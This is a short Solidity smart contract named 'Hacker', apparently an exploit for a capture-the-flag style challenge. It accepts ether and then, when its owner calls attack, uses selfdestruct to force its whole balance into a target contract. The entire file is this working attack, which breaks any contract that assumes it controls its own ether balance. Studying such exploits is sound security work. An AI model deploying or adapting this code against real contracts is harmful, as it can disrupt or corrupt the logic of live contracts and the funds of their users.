// SPDX-License-Identifier: MIT
pragma solidity >=0.8.5 <0.9.0;

contract Hacker {
  address public hacker;

  modifier onlyHacker {
    require(msg.sender == hacker, "caller is not the hacker");
    _;
  }

  constructor() {
    hacker = payable(msg.sender);
  }

  /// @notice 0. receive some ether.
  receive() external payable {}

  /// @notice 1. then self-destruct, resulting the current balance moves into target address.
  function attack(address _target) public onlyHacker {
    selfdestruct(payable(_target));
  }
}
